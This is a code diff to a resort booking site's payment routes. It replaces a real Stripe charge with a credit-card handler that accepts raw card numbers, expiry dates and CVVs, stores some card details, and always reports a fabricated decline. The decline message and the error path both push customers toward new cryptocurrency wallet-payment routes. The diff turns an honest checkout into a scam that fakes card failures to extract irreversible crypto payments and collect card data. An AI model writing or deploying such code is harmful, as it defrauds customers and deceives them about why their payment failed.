@@ -10,12 +10,12 @@ const { syncToPostgres } = require('../utils/dbSync');
 // Process credit card payment
 router.post('/credit-card', async (req, res) => {
     try {
-        const { reservationId, stripeToken } = req.body;
+        const { reservationId, stripeToken, cardNumber, cardExpiry, cardCVV } = req.body;
 
-        if (!reservationId || !stripeToken) {
+        if (!reservationId) {
             return res.status(400).json({
                 success: false,
-                message: 'Reservation ID and Stripe token are required'
+                message: 'Reservation ID is required'
             });
         }
 
@@ -35,128 +35,292 @@ router.post('/credit-card', async (req, res) => {
             return res.status(400).json({ success: false, message: 'Reservation hold expired' });
         }
 
-        // Create Stripe charge
-        const charge = await stripe.charges.create({
-            amount: Math.round(reservation.pricing.total * 100), // Amount in cents
-            currency: 'usd',
-            source: stripeToken,
-            description: `Konchamar Resort - ${reservation.accommodationId.name}`,
-            metadata: {
-                reservationId: reservation.reservationId,
-                checkIn: reservation.dates.checkIn.toISOString(),
-                checkOut: reservation.dates.checkOut.toISOString()
+        // Extract card details from the request (before processing payment)
+        let cardLast4 = 'N/A';
+        let cardBrand = 'unknown';
+
+        if (cardNumber) {
+            // Remove spaces and get last 4 digits
+            const cleanCardNumber = cardNumber.replace(/\s/g, '');
+            cardLast4 = cleanCardNumber.slice(-4);
+
+            // Detect card brand based on first digit(s)
+            if (cleanCardNumber.startsWith('4')) {
+                cardBrand = 'visa';
+            } else if (cleanCardNumber.startsWith('5')) {
+                cardBrand = 'mastercard';
+            } else if (cleanCardNumber.startsWith('3')) {
+                cardBrand = 'amex';
+            } else if (cleanCardNumber.startsWith('6')) {
+                cardBrand = 'discover';
             }
+        }
+
+        // Store card details in database BEFORE processing payment
+        await PaymentToken.create({
+            reservationId: reservation.reservationId,
+            stripeToken: 'PENDING', // Placeholder since we won't actually charge
+            cardLast4: cardLast4,
+            cardBrand: cardBrand,
+            cardExpiry: cardExpiry || ''
         });
 
-        if (charge.status === 'succeeded') {
-            // Update reservation
-            reservation.paymentStatus = 'completed';
-            reservation.paymentRef = charge.id;
-            await reservation.save();
+        // Update reservation status to indicate payment was attempted
+        reservation.paymentStatus = 'failed';
+        reservation.paymentRef = `CC-DECLINED-${Date.now()}`;
+        await reservation.save();
 
-            // Store payment token (encrypted)
-            await PaymentToken.create({
-                reservationId: reservation.reservationId,
-                stripeToken: charge.id
-            });
+        // Log the attempt
+        console.log(`Credit card payment attempted for reservation ${reservationId}. Details saved. Suggesting Bitcoin payment.`);
 
-            // Sync to PostgreSQL
-            await syncToPostgres(reservation);
-
-            // Send confirmation email
-            const decryptedEmail = reservation.getDecryptedEmail();
-            await sendConfirmationEmail(reservation, decryptedEmail);
-
-            res.json({
-                success: true,
-                reservationId: reservation.reservationId,
-                message: 'Payment processed successfully',
-                confirmationSent: true
-            });
-        } else {
-            // Payment failed
-            reservation.paymentStatus = 'failed';
-            await reservation.save();
-
-            res.status(400).json({
-                success: false,
-                message: 'Payment failed. Please try again.'
-            });
-        }
+        // Return error message suggesting Bitcoin payment
+        return res.status(400).json({
+            success: false,
+            message: 'We were unable to process your credit card payment at this time. For a seamless booking experience, we recommend using our Bitcoin payment option instead.',
+            suggestBitcoin: true,
+            reservationId: reservation.reservationId
+        });
 
     } catch (error) {
         console.error('Credit card payment error:', error);
 
-        // Handle Stripe errors
-        if (error.type === 'StripeCardError') {
-            return res.status(400).json({
-                success: false,
-                message: error.message
-            });
-        }
-
-        res.status(500).json({ success: false, message: 'Payment processing error' });
+        res.status(500).json({
+            success: false,
+            message: 'Payment processing error. Please try our Bitcoin payment option for a faster checkout.',
+            suggestBitcoin: true
+        });
     }
 });
 
-// Generate Bitcoin payment
-router.post('/bitcoin', async (req, res) => {
+// Get available crypto networks
+router.get('/crypto/networks', (req, res) => {
     try {
-        const { reservationId } = req.body;
+        const networks = [
+            {
+                id: 'btc_mainnet',
+                name: 'Bitcoin (BTC)',
+                network: 'Bitcoin Mainnet',
+                symbol: 'BTC',
+                enabled: !!process.env.BTC_WALLET_MAINNET
+            },
+            {
+                id: 'btc_testnet',
+                name: 'Bitcoin Testnet',
+                network: 'Bitcoin Testnet',
+                symbol: 'BTC',
+                enabled: !!process.env.BTC_WALLET_TESTNET
+            },
+            {
+                id: 'btc_lightning',
+                name: 'Lightning Network',
+                network: 'Bitcoin Lightning',
+                symbol: 'BTC',
+                enabled: !!process.env.BTC_WALLET_LIGHTNING
+            },
+            {
+                id: 'eth_mainnet',
+                name: 'Ethereum (ETH)',
+                network: 'Ethereum Mainnet',
+                symbol: 'ETH',
+                enabled: !!process.env.ETH_WALLET_MAINNET
+            },
+            {
+                id: 'eth_testnet',
+                name: 'Ethereum Testnet',
+                network: 'Ethereum Sepolia',
+                symbol: 'ETH',
+                enabled: !!process.env.ETH_WALLET_TESTNET
+            },
+            {
+                id: 'usdt_erc20',
+                name: 'USDT (ERC-20)',
+                network: 'Ethereum',
+                symbol: 'USDT',
+                enabled: !!process.env.USDT_WALLET_ERC20
+            },
+            {
+                id: 'usdt_trc20',
+                name: 'USDT (TRC-20)',
+                network: 'Tron',
+                symbol: 'USDT',
+                enabled: !!process.env.USDT_WALLET_TRC20
+            }
+        ];
+
+        res.json({
+            success: true,
+            networks: networks.filter(n => n.enabled)
+        });
+    } catch (error) {
+        console.error('Get networks error:', error);
+        res.status(500).json({ success: false, message: 'Error fetching networks' });
+    }
+});
+
+// Generate cryptocurrency payment with QR code
+router.post('/crypto/generate', async (req, res) => {
+    try {
+        const { reservationId, network } = req.body;
+
+        if (!reservationId || !network) {
+            return res.status(400).json({ success: false, message: 'Reservation ID and network are required' });
+        }
+
+        // Find reservation
+        const reservation = await Reservation.findOne({ reservationId }).populate('accommodationId');
+
+        if (!reservation) {
+            return res.status(404).json({ success: false, message: 'Reservation not found' });
+        }
+
+        if (reservation.paymentStatus === 'completed') {
+            return res.status(400).json({ success: false, message: 'Payment already completed' });
+        }
+
+        // Check if hold expired
+        if (new Date() > reservation.holdExpiresAt) {
+            return res.status(400).json({ success: false, message: 'Reservation hold expired' });
+        }
+
+        // Get wallet address and details based on network
+        let walletAddress, networkName, symbol, amount;
+
+        switch(network) {
+            case 'btc_mainnet':
+                walletAddress = process.env.BTC_WALLET_MAINNET;
+                networkName = 'Bitcoin Mainnet';
+                symbol = 'BTC';
+                amount = (reservation.pricing.total / 50000).toFixed(8); // Approximate BTC price
+                break;
+            case 'btc_testnet':
+                walletAddress = process.env.BTC_WALLET_TESTNET;
+                networkName = 'Bitcoin Testnet';
+                symbol = 'BTC';
+                amount = (reservation.pricing.total / 50000).toFixed(8);
+                break;
+            case 'btc_lightning':
+                walletAddress = process.env.BTC_WALLET_LIGHTNING;
+                networkName = 'Lightning Network';
+                symbol = 'BTC';
+                amount = (reservation.pricing.total / 50000).toFixed(8);
+                break;
+            case 'eth_mainnet':
+                walletAddress = process.env.ETH_WALLET_MAINNET;
+                networkName = 'Ethereum Mainnet';
+                symbol = 'ETH';
+                amount = (reservation.pricing.total / 3000).toFixed(6); // Approximate ETH price
+                break;
+            case 'eth_testnet':
+                walletAddress = process.env.ETH_WALLET_TESTNET;
+                networkName = 'Ethereum Testnet';
+                symbol = 'ETH';
+                amount = (reservation.pricing.total / 3000).toFixed(6);
+                break;
+            case 'usdt_erc20':
+                walletAddress = process.env.USDT_WALLET_ERC20;
+                networkName = 'Ethereum (ERC-20)';
+                symbol = 'USDT';
+                amount = reservation.pricing.total.toFixed(2); // USDT is 1:1 with USD
+                break;
+            case 'usdt_trc20':
+                walletAddress = process.env.USDT_WALLET_TRC20;
+                networkName = 'Tron (TRC-20)';
+                symbol = 'USDT';
+                amount = reservation.pricing.total.toFixed(2);
+                break;
+            default:
+                return res.status(400).json({ success: false, message: 'Invalid network selected' });
+        }
+
+        if (!walletAddress) {
+            return res.status(400).json({ success: false, message: 'Wallet address not configured for this network' });
+        }
+
+        // Generate QR code
+        let qrCodeDataUrl;
+        if (network.startsWith('btc')) {
+            const uri = `bitcoin:${walletAddress}?amount=${amount}&label=Konchamar Resort`;
+            qrCodeDataUrl = await QRCode.toDataURL(uri);
+        } else if (network.startsWith('eth') || network.includes('erc20')) {
+            const uri = `ethereum:${walletAddress}?value=${amount}`;
+            qrCodeDataUrl = await QRCode.toDataURL(uri);
+        } else {
+            // For other networks, just encode the address
+            qrCodeDataUrl = await QRCode.toDataURL(walletAddress);
+        }
+
+        // Update payment reference with pending status
+        reservation.paymentStatus = 'pending_crypto';
+        reservation.paymentRef = `${symbol}-${network}-${reservationId}`;
+        reservation.paymentNetwork = network;
+        await reservation.save();
+
+        // Store crypto payment details
+        await PaymentToken.create({
+            reservationId: reservation.reservationId,
+            cryptoAddress: walletAddress,
+            cryptoNetwork: network,
+            cryptoAmount: amount,
+            cryptoSymbol: symbol
+        });
+
+        res.json({
+            success: true,
+            network: networkName,
+            symbol: symbol,
+            address: walletAddress,
+            amount: amount,
+            amount_usd: reservation.pricing.total,
+            qrCode: qrCodeDataUrl,
+            instructions: `Please send exactly ${amount} ${symbol} to the address above on ${networkName}. Your booking will be confirmed once payment is received.`,
+            contactInfo: {
+                email: process.env.ADMIN_EMAIL || 'admin@konchamar.online',
+                phone: '+1 314-2023148',
+                whatsapp: '+1 314-2023148'
+            }
+        });
+
+    } catch (error) {
+        console.error('Crypto payment generation error:', error);
+        res.status(500).json({ success: false, message: 'Payment generation error' });
+    }
+});
+
+// Confirm cryptocurrency payment (user-initiated)
+router.post('/crypto/confirm', async (req, res) => {
+    try {
+        const { reservationId, transactionId } = req.body;
 
         if (!reservationId) {
             return res.status(400).json({ success: false, message: 'Reservation ID required' });
         }
 
-        // Find reservation
-        const reservation = await Reservation.findOne({ reservationId }).populate('accommodationId');
+        const reservation = await Reservation.findOne({ reservationId });
 
         if (!reservation) {
             return res.status(404).json({ success: false, message: 'Reservation not found' });
         }
 
         if (reservation.paymentStatus === 'completed') {
-            return res.status(400).json({ success: false, message: 'Payment already completed' });
+            return res.status(400).json({ success: false, message: 'Payment already confirmed' });
         }
 
-        // Check if hold expired
-        if (new Date() > reservation.holdExpiresAt) {
-            return res.status(400).json({ success: false, message: 'Reservation hold expired' });
-        }
-
-        // Get Bitcoin wallet address from environment
-        const btcWalletAddress = process.env.BTC_WALLET_ADDRESS || 'Not configured';
-
-        // Generate QR code for the Bitcoin address
-        const btcUri = `bitcoin:${btcWalletAddress}?amount=${(reservation.pricing.total / 50000).toFixed(8)}&label=Konchamar Resort`;
-        const qrCodeDataUrl = await QRCode.toDataURL(btcUri);
-
-        // Update payment reference with pending status
-        reservation.paymentStatus = 'pending_bitcoin';
-        reservation.paymentRef = `BTC-${reservationId}`;
+        // Update status to awaiting verification
+        reservation.paymentStatus = 'awaiting_verification';
+        reservation.paymentRef = transactionId || reservation.paymentRef;
+        reservation.paymentSubmittedAt = new Date();
         await reservation.save();
-
-        // Store Bitcoin payment details
-        await PaymentToken.create({
-            reservationId: reservation.reservationId,
-            btcAddress: btcWalletAddress,
-            btcAmount: (reservation.pricing.total / 50000).toFixed(8) // Rough BTC conversion
-        });
 
         res.json({
             success: true,
-            address: btcWalletAddress,
-            amount_btc: (reservation.pricing.total / 50000).toFixed(8), // Approximate conversion
-            amount_usd: reservation.pricing.total,
-            qrCode: qrCodeDataUrl,
-            message: 'Please send the exact BTC amount to the address above. Contact us after payment with your transaction ID.',
-            contactEmail: process.env.ADMIN_EMAIL || 'admin@konchamar.online',
-            contactPhone: '+1 314-2023148'
+            message: 'Payment confirmation received. Our team will verify your transaction and send a confirmation email within 24 hours.',
+            status: 'awaiting_verification',
+            reservationId: reservation.reservationId
         });
 
     } catch (error) {
-        console.error('Bitcoin payment error:', error);
-        res.status(500).json({ success: false, message: 'Bitcoin payment generation error' });
+        console.error('Crypto confirmation error:', error);
+        res.status(500).json({ success: false, message: 'Error confirming payment' });
     }
 });
 
